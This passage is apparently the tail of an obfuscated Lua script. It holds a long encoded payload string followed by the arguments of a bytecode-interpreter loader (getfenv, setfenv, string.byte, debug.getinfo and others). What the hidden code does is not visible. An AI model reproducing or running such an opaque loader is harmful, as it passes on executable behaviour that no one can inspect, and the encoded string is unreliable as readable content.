EL330P347S335U31DE39EQ3PTG3ML23CKT39XQ3B4D3O9C3BP6333U2FB37YI3QA4338K3ASF32Z23Q8M3LNZ2GE3LA5336F3Q8L31DL3CPS34YM31123QJD384U37TJ3QJT3O8I3Q8V3AJK3A4J3AV82SO3Q4A3Q9M3QAN335C316X3Q4E3101386Q3EXV39OU314F37TJ38IR37YI317A3LA538663MUF31HV3QJQ33O43QKF3BPT333U3QKO3QC53NNU3G0J3AKQ2EY3C1X2GE38EK3K6B3QKZ3CNZ3JBY2EY3QBO333U38PN3ASM3D083ABV3QJR34NU2EY39PA3C0X3HFI3QL63BDI3QBV33AG2SO3ASH3A2T3GB43C32332D2GE3QL73DTS3QLS33BM3QLJ32Z138BK3D083N5Q3QKW334T37W03K6B318D3NOC384X380Q391B33PV3DMD2943MM6392K3ASH3QFM3AUF2W2348N3FAO3C9U3DTN3PVK39XH3A2M396I3Q5Z3C163MU33AJO3Q6W3QMH3K6433CE2FR38W33NPB39Z43QIQ3LE9334R2BL3ARQ3ICT3ODW3BBC3ASA3A9J3MWP3QG53QBW35KZ3QAF3NPE38PI38BE3KIP39VB2W231DE3Q7Y33PV36YG37RO3J7W3BWH3BJD3QIF3G1Z39VO3BPP3ASA3N2S35ET3ARQ2W83BRJ2FR390H3QN1333U3QO739UR3BQ43AJO3AAO3QNF32ZR3QNH3C373JQF2W83BQA39VI3FEN37TJ329Q333X2SO315X344838392SO3QOP3QKP27D3QOW3AOZ310N3AVC3QOR27D3I9R35ET3QK23M41333O2SO2AB3LA93QPB3ARR37SO3BQH3QK43ADV3BPS3QP73MTU36Y33QKA32NH34EC2OW314F34EL38353QPF3QKT3BB738D53KS138NQ317A315X3K8J3NU13EBG38E33F4738NQ3AKL37U93D3U314F334Q3QNP3363314F3C1X2FR29H3K6B3QQI3ML63QNX3C1U3BV93ASA34G238DA3QO33CLH2FR396S3QO827D3QQV3QOB3BT83B4R3EIK3BOG3QOH3CVU3QOJ3OAB3AUF3NHE3AC6396G3QOQ3BAS34HP37X42SO3QRB3QOX38523QKW332D2ZF31I43LA93QRN3HHZ3QP132Z237B73QPF32ZR3QPH21B34IK32HZ3QPN35KZ3QPQ27D34JW37TD37WE3JFS3EBG2UG31QH34L732ZR388C3QNL3QRW32YX3QQD3M413DMS34JN3J9N2FR391X3K6B3QSN3QQL38RV3QNY3APM3ASA3H7M38MV3QQS3C2A2FR31S43QQW27A3QT03QQZ3BUN3QR1331J3QOF3EXV2TJ3B483BPR3QOK3M773QR938HO39C73QRC315X3QRE3CCK2SO3QTH3QRI36RP3QRK388H39C33LA93QTS3QRQ3QNT3QRT3BOG3QRW34MV3QRZ3BOG3QS23LIS39OY3A3N386Q38JP35KZ3QS927D34P035KZ3QSD3KKW316X3QSG38T633PV380R3DW734SI3QQG3C6L3C9937TJ398T3ASM39XT3BA03JQP33393ASA34ST3QSW3ASQ3QO433M92FR26R3QL437VU3QV437YI2FR3QR03QGW3OJW3BBC3QR434T23FAO3QTD3MWV3QTF37VU26T3QI7332O3QP3383L39VA2SO3QVL392G37TJ3QVS3APV2ZF26U3QI5333U3QVY37RN3QRR32Z13QTX3BQ83QRW34V13CVD3BBC3QU321B34QP3QU13QS6398H3B9M3QUA27A34SA38PI3QUE3JO63QUG3DW23QIX3QUK39XH34TX3QSL3GQH3QUP333U2SB3QUS3QQM3QUV3AS53B7B3JS63QO23QV03QQT37T53QV537TJ25V3BDI3QV93QT53QVB3QT83ARY2TJ34X73LDT3QVH3FAX3QVJ37TJ25X3QVM31013QTJ3QVQ37FX3HM83QXO3QTQ2ZF25Y3QVZ27D3QXZ3QW23QTW348K38PI3QRW34YM3QU13BQ83QWB34Z439PE3QU639DL3QS838AJ3G103QUD382C3QWN3NTW3QSH3MTU3DMS35053QWU25I3QWW27D3QYS3QWZ3QSR3QQN3BAL3ASA350O3QQR3QX63QSY335Y3Q3U3QL5387D3Q3U3AS03QOC3QT63G473BQ83QR435163KKZ3QXL3C163QXN333U21H3Q3U33393QVO3AA33QXT3QZM3QVT3QZL3Q3U333O2ZF21I3Q3U3API3Q3W3QNS3BPN3QW53EBG3QRW3A0S3QW93B9M3QWB352G3QWE3R083QU832ZR3QWI35323QWL3QYK3HVZ34733QUH332H33633QWR294353V3QWU2123Q3U3C4S3R0T3QYW3B1V3QX13AVD3ALJ3BPS3QSX3CNZ2FR3Q3T3QT1353F3QZ929J3QXD3C593QZC3G6V3QZE3DW8355B3QZH3QR739VB3QZK27D1L3QZN3QVN3QRD3QXT3R1N3QZT3R1M3QZV3QRL34PP3QZZ37VU1M3R013QW332Z03R043BB73QRW35653QY93EBG3QWB357V3QS53R0D3BOG3R0G3BFV3QYJ3QM73R0K3QWO3DQR3QWQ3A54357N3QWU163R0U37VU3R2Q2BM3Q8139H13FZR',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
